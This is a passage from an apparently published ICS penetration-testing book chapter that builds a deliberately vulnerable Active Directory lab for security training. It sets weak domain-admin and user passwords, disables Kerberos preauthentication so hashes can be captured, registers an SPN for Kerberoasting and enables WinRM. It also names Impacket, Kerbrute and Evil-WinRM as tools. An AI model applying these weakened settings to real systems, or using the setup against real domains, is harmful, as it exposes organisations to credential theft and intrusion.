- en: '*Chapter 10*: I Can Do It 420'
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Up till now, there has been a heavy focus on automation – understanding what
    a PLC is and how it communicates. A key topic discussed was connectivity – specifically,
    connecting the PLC to the physical I/O, and also connecting it back up to SCADA.
    We also learned about Modbus and Ethernet/IP, and how to interact with the I/O.
    Additionally, we discussed using various tools to scan and enumerate ports and
    services in order to discover what protocols could be running in the environment.
    In the last chapter, we looked at using Burp Suite to interact with Ignition,
    our web-hosted SCADA system. All these tools and skills are critical to completing
    a successful engagement. However, we have in actuality spent most of our time
    looking at the SCADA and physical hardware side of the network. Depending on your
    engagement, typically considered **white box**, it is possible that the customer
    will drop you into the ICS network and basically give you free run to do discovery,
    and provide you with the following: an **Active Directory** (**AD**) account and
    a diagram of the ICS network. This allows you to avoid the pitfalls of traversing
    the corporate side of the network, and instead move down through **demilitarized
    zones**, past **firewalls**, and into new **domains**.'
  prefs: []
  type: TYPE_NORMAL
- en: Justice wouldn't be done if this was all we focused on in this chapter. In most
    engagements, I have been typically thrown into the corporate side of the network,
    then asked to breach into the industrial network. Doing this requires an understanding
    of the technology present in the industrial network. This understanding will allow
    us to gain a foothold to go deeper into the network. Here, we are going to add
    a couple more elements to our ever-growing lab. We will be simulating a **gray
    box** test where you will be dropped into the **corporate network**, and subsequently
    discover a path through.
  prefs: []
  type: TYPE_NORMAL
- en: 'In this chapter, we''re going to cover the following main topics:'
  prefs: []
  type: TYPE_NORMAL
- en: Installing corporate environment elements
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Discovering and launching our attacks
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Getting shells
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Technical requirements
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'For this chapter, you will need the following:'
  prefs: []
  type: TYPE_NORMAL
- en: 'A Windows 2019 domain controller, installed and configured. Click on the following
    link to download an ISO for the server of your choice: [https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2019](https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2019).'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'A Windows 10 workstation connected to the domain controller. Click on the following
    link to get access to a Windows 10 ISO: [https://www.microsoft.com/en-ca/software-download/windows10ISO](https://www.microsoft.com/en-ca/software-download/windows10ISO).'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'A Kali Linux VM already running, and with the following tools installed:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Impacket**: This is available here: [https://github.com/SecureAuthCorp/impacket/releases](https://github.com/SecureAuthCorp/impacket/releases).'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Kerbrute**: This is available here: [https://github.com/ropnop/kerbrute/releases/tag/v1.0.3](https://github.com/ropnop/kerbrute/releases/tag/v1.0.3).'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Evil-WinRM**: This is available here: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm).'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: 'You can view this chapter''s code in action here: [https://bit.ly/3AzpxFp](https://bit.ly/3AzpxFp)'
  prefs: []
  type: TYPE_NORMAL
- en: Installing corporate environment elements
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'In [*Chapter 1*](B16321_01_Epub_AM.xhtml#_idTextAnchor013), *Using Virtualization*,
    we installed four **virtual machines** (**VMs**), consisting of two Ubuntu, one
    Windows 7, and one Kali Linux distribution. We then proceeded to create subnets
    based on the **Purdue model**, and then assigned static IP addresses to those
    individual VMs, aligning them individually to their respective organizational
    network levels. In this section, we are going to add the corporate side of an
    ICS lab by setting up a Windows 2019 domain controller running AD, **Domain Name
    System** (**DNS**), and a **Dynamic Host Configuration Protocol** (**DHCP**) server.
    We will also connect a Windows 10 workstation to the domain. As a refresher, our
    lab should currently look something like the following figure:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 10.1 – Current lab layout'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/Figure_10.01_B16321.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10.1 – Current lab layout
  prefs: []
  type: TYPE_NORMAL
- en: 'Once you complete the setup of the domain controller and workstation, your
    network layout should appear similar to the following figure:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 10.2 – Corporate lab additions'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/Figure_10.02_B16321.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10.2 – Corporate lab additions
  prefs: []
  type: TYPE_NORMAL
- en: Next, we'll take a look at installing and configuring the domain controller.
  prefs: []
  type: TYPE_NORMAL
- en: Installing and configuring the domain controller
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'Navigate to the following link to find the ISO related to the domain controller
    lab: [https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2019](https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2019).'
  prefs: []
  type: TYPE_NORMAL
- en: 'I am now going to list the steps that we will take to install and configure
    the domain controller. However, I will not cover some of the more obvious steps,
    nor will I restate anything that we covered in [*Chapter 1*](B16321_01_Epub_AM.xhtml#_idTextAnchor013),
    *Using Virtualization*. If you need a refresher on getting an ISO into the datastore
    of your ESXi server, I recommend going back to [*Chapter 1*](B16321_01_Epub_AM.xhtml#_idTextAnchor013),
    *Using Virtualization*. The following are the steps required:'
  prefs: []
  type: TYPE_NORMAL
- en: I am going to assume that you can get the ISO spun up, as well as getting the
    domain controller to the Windows Update portion of the steps. Now refer to the
    following screenshot, as this is where we will pick up the installation and configuration
    portion:![Figure 10.3 – Windows Update
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/Figure_10.03_B16321.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 10.3 – Windows Update
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: From here we want to disable the **VM Network** interface and set a static IP
    address to **127.0.0.1** for the preferred DNS server, as shown in the following
    screenshot:![Figure 10.4 – Enterprise interface
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/Figure_10.04_B16321.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 10.4 – Enterprise interface
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Next, we are going to change the name of the machine. I will be using the name
    **dc01**, as shown in the following screenshot:![Figure 10.5 – Changing the name
    of the machine
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/Figure_10.05_B16321.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 10.5 – Changing the name of the machine
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Your machine will now require a restart to have the name change be applied.
    You will be prompted with a popup that allows you to restart the system. Once
    the server reboots, we want to navigate to the **Server Manager** screen and select
    **Add roles and features**, as seen in the next screenshot:![Figure 10.6 – Add
    roles and features
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/Figure_10.06_B16321.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 10.6 – Add roles and features
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'You will be prompted with a **Select installation type** screen, where you
    want to select **Next >**, as seen in the following screenshot:'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '![Figure 10.7 – Select installation type'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '](image/Figure_10.07_B16321.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 10.7 – Select installation type
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Next, you will be presented with a **Select destination server** screen, and
    from here you want to make sure that you have selected your primary server and
    clicked **Next >**, as shown in the following screenshot:![Figure 10.8 – Select
    destination server
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/Figure_10.08_B16321.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 10.8 – Select destination server
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: From here, you will be presented with a series of roles that you can choose
    from. We want to select **Active Directory Domain Services**, **DHCP Server**,
    and **DNS Server**, as shown in the following screenshot:![Figure 10.9 – Select
    server roles
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/Figure_10.09_B16321.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 10.9 – Select server roles
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: After selecting each checkbox, you will be presented with a popup that provides
    details on the role that you will be installing. Click the **Add feature** button
    to confirm each role is selected. You will then see the **Select features** window.
    Simply click **Next >** without selecting any features (except for the ones which
    are selected by default) to continue the installation process, as shown in the
    following screenshot:![Figure 10.10 – Select features
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/Figure_10.10_B16321.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 10.10 – Select features
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Click the **Next >** button through the **AD DS**, **DHCP Server**, and **DNS
    Server** info screens. You will then arrive at the **Confirm installation selections**
    screen, where you can continue by clicking the **Install** button:![Figure 10.11
    – Confirm installation selections
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/Figure_10.11_B16321.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 10.11 – Confirm installation selections
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Once installed, you will be brought to an **Installation progress** screen where
    you will click the **Promote this server to a domain controller** option, as shown
    in the following screenshot:![Figure 10.12 – Promoting the domain controller
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/Figure_10.12_B16321.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 10.12 – Promoting the domain controller
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Here, you are going to select the **Add a new forest** option. Then set the
    domain name to **labcorp.local** and click the **Next >** button:![Figure 10.13
    – Deployment Configuration
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/Figure_10.13_B16321.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 10.13 – Deployment Configuration
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Next, you will see **Domain Controller Options**. Keep everything as it is and
    set your **Directory Services Restore Mode** (**DSRM**) password, as shown in
    the following screenshot:![Figure 10.14 – Domain Controller Options
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/Figure_10.14_B16321.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 10.14 – Domain Controller Options
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Click **Next >** through the DNS options without selecting **Create DNS delegation**.
    You then will be presented with **Additional Options**. In this window, the NetBIOS
    domain name will be auto-generated for you. Click **Next >** and then click **Next
    >** again on the **Paths** screen. Click **Next >** once again on the **Review
    Options** screen. Doing this will begin the prerequisites check. From here, we
    want to click **Install**, as depicted in the following screenshot:![Figure 10.15
    – Prerequisites Check
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/Figure_10.15_B16321.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 10.15 – Prerequisites Check
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Once the installation finishes, you will be logged out and the server will reboot.
    Once the system comes back up, you will see that you now have a **LABCORP** domain,
    as shown in the following screenshot:![Figure 10.16 – LABCORP domain
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/Figure_10.16_B16321.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 10.16 – LABCORP domain
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Now that we have AD installed, we want to quickly add a domain admin to continue
    with the next two server configurations. Go ahead and add a new user under **Active
    Directory Users and Computers**, as shown here:![Figure 10.17 – Users and Computers
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/Figure_10.17_B16321.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 10.17 – Users and Computers
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: I have used **lab.da:Password123** as my credentials and set the new user to
    be a member of **Domain Admins**, as shown here:![Figure 10.18 – Domain Admins
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/Figure_10.18_B16321.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 10.18 – Domain Admins
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'Since you are already adding a domain admin, you will continue and add **LabGroups**
    and **LabUsers** as an organizational unit under the **labcorp.local** domain,
    as shown here:'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '![Figure 10.19 – Organizational groups'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '](image/Figure_10.19_B16321.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 10.19 – Organizational groups
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'Next, you will create a group under the **LabGroups** organizational unit,
    named **Scada**:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![Figure 10.20 – Scada group'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/Figure_10.20_B16321.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10.20 – Scada group
  prefs: []
  type: TYPE_NORMAL
- en: 'Now, you want to create three new users and add them to the **LabUsers** organizational
    unit. The users will be as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '**operator1**/**Password1**'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**operator2**/**Password2**'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**operator3**/**Password3**'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'Here is an example using **operator1**, setting the password to be **Password1234**,
    and making them a member of **Scada**:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 10.21 – LabUsers operator1'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/Figure_10.21_B16321.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10.21 – LabUsers operator1
  prefs: []
  type: TYPE_NORMAL
- en: 'When creating the **operator2** account, we are going to adjust a particular
    setting that will be discussed in the next section. Under **Users and Computers**,
    we want to select **operator2**, and then select the **Account** tab. Then, under
    the **Account** options, select the **Do not require Kerberos preauthentication
    option**. This is ultimately a protection mechanism against Kerberos brute force.
    If it is disabled, we can capture hashes for the users that are not using this
    feature:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 10.22 – Disable Kerberos preauthentication'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/Figure_10.22_B16321.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10.22 – Disable Kerberos preauthentication
  prefs: []
  type: TYPE_NORMAL
- en: Now that we have disabled Kerberos preauthentication, we will continue installing
    and configuring the DNS server.
  prefs: []
  type: TYPE_NORMAL
- en: Adding and installing the DNS server
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'The next step will be to sign out of the local administrator account and log
    back into the server as **labcorp\lab.da** to continue with the configuration
    of the DNS server:'
  prefs: []
  type: TYPE_NORMAL
- en: On the **Server Manager** dashboard, select the **DNS** option from the menu
    on the left-hand side. This will bring up a list of servers that can be configured
    for the DNS. Select the **DC01** server and right-click on it. This will bring
    up a context menu, allowing us to select **DNS Manager**:![Figure 10.23 – DNS
    server
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/Figure_10.23_B16321.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 10.23 – DNS server
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '**DNS Manager** will generate a popup, listing the servers that you have the
    ability to add zones to. We are going to create a new zone under the **Reverse
    Lookup Zones** folder:![Figure 10.24 – DNS Manager'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/Figure_10.24_B16321.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 10.24 – DNS Manager
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Here, we want to select **Primary zone** and then click the **Next >** button:![Figure
    10.25 – New zone wizard
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/Figure_10.25_B16321.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 10.25 – New zone wizard
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Then, we want to select the option to replicate on all domain controllers in
    the **labcorp.local** domain. Click the **Next >** button and then select the
    **Ipv4 Reverse Lookup Zone option**, and proceed by clicking **Next >** again.
    After these two screens, you will be brought to a screen where you can declare
    the network ID for **Reverse Lookup Zone Name**:![Figure 10.26 – Reverse Lookup
    Zone Name
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/Figure_10.26_B16321.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 10.26 – Reverse Lookup Zone Name
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Click **Next >** on the **Dynamic Update** screen, then finally click **Finish**.
    You will now see a reverse zone established and running. Next, we want to set
    the resource scavenging by right-clicking on the server and selecting **Set Aging/Scavenging
    for All Zones…**:![Figure 10.27 – Scavenging for all zones
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/Figure_10.27_B16321.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 10.27 – Scavenging for all zones
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'Set the option to **Scavenge stale resource records**, and then apply the settings
    shown in the following screenshot:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![Figure 10.28 – Set Aging/Scavenging Properties'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/Figure_10.28_B16321.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10.28 – Set Aging/Scavenging Properties
  prefs: []
  type: TYPE_NORMAL
- en: After you have set the aging/scavenging properties, you will have finished configuring
    the DNS server. Now, we will continue by installing and configuring the DHCP server.
  prefs: []
  type: TYPE_NORMAL
- en: Adding and installing the DHCP server
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'We have completed the setup for the DNS server. Now, we will move on to the
    addition and installation of the DHCP server, by taking the following steps:'
  prefs: []
  type: TYPE_NORMAL
- en: Clicking the **DHCP** option on the left-hand side menu will bring up the list
    of servers. You should see a notification – **Configuration required for DHCP
    Server at DC01**. Right-click on the server and select **DHCP Manager**:![Figure
    10.29 – DHCP server configuration
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/Figure_10.29_B16321.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 10.29 – DHCP server configuration
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'You will then be presented with the following screen:'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '![Figure 10.30 – DHCP Manager'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '](image/Figure_10.30_B16321.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 10.30 – DHCP Manager
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Right-click on the **dc01.labcorp.local** server and select **Authorize** from
    the context menu:![Figure 10.31 – Context menu
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/Figure_10.31_B16321.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 10.31 – Context menu
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: After authorization, we are going to add a new scope for IPv4\. Right-click
    the **IPv4** icon and select **New Scope...**:![Figure 10.32 – IPv4 new scope
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/Figure_10.32_B16321.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 10.32 – IPv4 new scope
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: This will bring up a series of configuration screens. Click through the screens
    and give your scope a name. I used **Lab Corp** as a name to keep things simple.
    Next, you will be brought to an **IP Address Range** configuration screen, where
    you will need to enter your starting and ending IP address. The next screen shows
    the options that I have picked:![Figure 10.33 – IP Address Range
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/Figure_10.33_B16321.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 10.33 – IP Address Range
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: For the **Add Exclusions and Delay** option, I simply left it blank and clicked
    the **Next >** button. For the **Lease Duration** option, I set it to **8** days
    and clicked **Next >**. After doing this, you will be brought to a screen where
    you want to select **Yes** to apply these options. After doing this, click the
    **Next >** button. On the **Router** screen, I didn't make any changes and clicked
    **Next >**. If everything was configured in the correct order, you should now
    see a **Domain Name and DNS Servers** screen that should be auto-populated, as
    shown in the following screenshot:![Figure 10.34 – DNS servers screen
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/Figure_10.34_B16321.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 10.34 – DNS servers screen
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Click **Next >** through the subsequent screens, and make sure you select **Yes**
    to activate the scope. Finally, click the **Finish** button. Now, we want to run
    the post configuration by clicking the **More** link on the notification banner
    that we saw earlier. This brings us to a screen with the **Post-deployment Configuration**
    option, where we want to click **Complete DHCP configuration**:![Figure 10.35
    – Complete DHCP configuration
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/Figure_10.35_B16321.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 10.35 – Complete DHCP configuration
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'This will bring you to the following **Authorization** screen, where you will
    want to click the **Commit** button and then **Close**:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![Figure 10.36 – Authorization'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/Figure_10.36_B16321.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10.36 – Authorization
  prefs: []
  type: TYPE_NORMAL
- en: We should now have a fully configured domain controller running AD, DNS, and
    DHCP servers.
  prefs: []
  type: TYPE_NORMAL
- en: Adding and installing network file sharing
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'Next, we are going to simulate network file sharing by clicking on **File and
    Storage Services**, selecting **TASKS**, and clicking on **New Share…**, as shown
    in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 10.37 – File and Storage Services'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/Figure_10.37_B16321.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10.37 – File and Storage Services
  prefs: []
  type: TYPE_NORMAL
- en: 'In the next screenshot, you can see that we have five options for two protocols:'
  prefs: []
  type: TYPE_NORMAL
- en: '**Server Message Block** (**SMB**)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Network File System** (**NFS**)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'If you recall in [*Chapter 6*](B16321_06_Epub_AM.xhtml#_idTextAnchor063), *Packet
    Deep Dive*, we discussed that these protocols are commonly found inside of a corporate
    network. Here is one of the primary sources of those protocols. We want to generate
    **SMB Share – Quick**, as shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 10.38 – SMB and NFS share selection'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/Figure_10.38_B16321.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10.38 – SMB and NFS share selection
  prefs: []
  type: TYPE_NORMAL
- en: 'In the next step, we will select the server and share the location as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '**dc01**'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**C:**'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'We are going to give **LabFiles1** as the **share** name, as this in turn will
    autogenerate the **Local path to share** and **Remote path to share** values,
    as shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 10.39 – Specify share name'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/Figure_10.39_B16321.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10.39 – Specify share name
  prefs: []
  type: TYPE_NORMAL
- en: Now click the **Next >** button on the **Other Settings**, **Permissions**,
    and **Confirmation** screens. Finally, click **Create**, and there you have it.
    An SMB file share has been created.
  prefs: []
  type: TYPE_NORMAL
- en: Configuring Kerberos
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'We need to set up Kerberos on our domain controller to allow us to examine
    Kerberoasting, a common attack that can be used to exploit AD. Enter the following
    command to set up the **service principal name** (**SPN**), using **operator3**
    in this case:'
  prefs: []
  type: TYPE_NORMAL
- en: setspn -a DC01/operator3.labcorp.local:9999 labcorp\operator3
  prefs: []
  type: TYPE_NORMAL
- en: 'If the command is successful, you should see the following output:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 10.40 – SPN setup'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/Figure_10.40_B16321.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10.40 – SPN setup
  prefs: []
  type: TYPE_NORMAL
- en: Now that we have an SPN set, this concludes the steps for installing and configuring
    features on the domain controller. We can now move on to building the workstation.
  prefs: []
  type: TYPE_NORMAL
- en: Installing and configuring workstations
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'Navigate to the following link to find the ISO related to Windows 10: [https://www.microsoft.com/en-ca/software-download/windows10ISO](https://www.microsoft.com/en-ca/software-download/windows10ISO).'
  prefs: []
  type: TYPE_NORMAL
- en: 'I am going to let you spin up the Windows 10 Pro for Workstations VM, and I
    will simply skip ahead to the step where we add the workstation to the domain:'
  prefs: []
  type: TYPE_NORMAL
- en: After all the updates have been set, you will want to navigate to the Windows
    Start menu. From here, you will want to go to **Settings** | **System** | **About**
    | **Rename this PC (advanced)**, as shown in the following screenshot:![Figure
    10.41 – About PC
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/Figure_10.41_B16321.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 10.41 – About PC
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Click the **Rename this PC (advanced)** link on this screen, and it will bring
    up the following **System Properties** screen:![Figure 10.42 – System Properties
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/Figure_10.42_B16321.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 10.42 – System Properties
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: From here, click the **Change...** button to set **Computer name**. Then set
    the **Domain** name that the workstation can join, as shown here:![Figure 10.43
    – Computer name and domain
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/Figure_10.43_B16321.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 10.43 – Computer name and domain
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: If everything has been configured correctly, you should get a Windows Security
    popup asking you to enter the name and password of an account with permission
    to join the domain. If you recall in the last section, we created a Domain Admin
    account. Go ahead and use those credentials to add this workstation to the domain:![Figure
    10.44 – Domain Admin login
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/Figure_10.44_B16321.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 10.44 – Domain Admin login
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'If successful, you will be presented with the following message:'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '![Figure 10.45 – labcorp.local'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '](image/Figure_10.45_B16321.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 10.45 – labcorp.local
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Once you click the **OK** button, you will be notified that for the changes
    to take effect you will need to reboot the workstation. Go ahead and reboot it.
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'The final step will be to test whether the user that we created in the last
    section can log into this computer. Use the **operator1** account to log into
    the workstation computer:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![Figure 10.46 – operator1 login'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/Figure_10.46_B16321.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10.46 – operator1 login
  prefs: []
  type: TYPE_NORMAL
- en: 'A few extra configuration pieces need to be implemented in order to place the
    workstation into a vulnerable state:'
  prefs: []
  type: TYPE_NORMAL
- en: Turn the **Windows Remote Management** service on by simply starting it.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Add **Scada** to **Local** **Group** | **Remote Management Users.**
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Make sure firewall rules are enabled for port **3389**.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'Under **Services**, open up **Windows Remote Management (WS-Management) Properties**.
    Under **General**, we are going to set **Startup type** as **Automatic**, then
    click **Start** to get **Service status** as **Running**, as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 10.47 – Service status'
  prefs: []
